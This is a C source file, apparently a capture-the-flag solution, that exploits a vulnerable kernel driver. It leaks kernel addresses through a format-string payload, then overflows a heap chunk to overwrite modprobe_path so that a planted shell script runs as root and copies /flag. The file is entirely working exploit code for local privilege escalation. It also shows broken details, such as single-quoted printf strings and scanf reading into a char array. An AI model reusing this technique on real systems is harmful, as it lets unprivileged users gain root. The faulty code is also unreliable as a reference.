#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

int fd;
size_t offset = 0x0;

void cmalloc(int size){
    if(-1 == ioctl(fd, 0x73311337, size)){
        printf('malloc error\n');
    }
}

void cfree(){
    if(-1 == ioctl(fd, 0x13377331, NULL)){
        printf('free error\n');
    }
}

void cprintf(){
    if(-1 == ioctl(fd, 0xDEADBEEF, NULL)){
        printf('print error\n');
    }
}

void main(){
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
    system("chmod +x /tmp/ll");

    fd = open("/dev/meizijiutql", O_RDWR);
    char buf[0x1000] = { 0 };

    char mod[0x20] = { 0 };
    cmalloc(168);
    char buff[150] = "%llx-%llx-%llx-%llx-%llx-kernel:%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx";

    write(fd, buff, 150);

    printf("=========>begin leak addr\n");
    cprintf();
    cprintf();
    printf("===== please input modprobe_path(kernel_addr+0x107a0a1) addr:\n");
    scanf("%lx",mod);
    printf("modprobe_path:0x%lx\n",mod);

    printf("kmalloc first\n");
    cmalloc(0x80);
    write(fd, buf, 0x60);
    cprintf();
    cprintf();

    cmalloc(0x400);
    cmalloc(0x400);

    memset(buf, 'a', 0x400);
    strncat(buf, mod, 0x8);
    printf("modprobe_path: %lx\n",buf[0x400]);
    cmalloc(0x400);
    printf("chunk overflow\n");
    write(fd, buf, 0x408);
    cmalloc(0x400);

    write(fd, "/tmp/getflag.sh", 0x20);
    cmalloc(0x400);
    printf("change modprobe_path\n");
    write(fd, "/tmp/getflag.sh", 0x20);

    close(fd);
    system("/tmp/ll");
    system("cat /tmp/flag");
}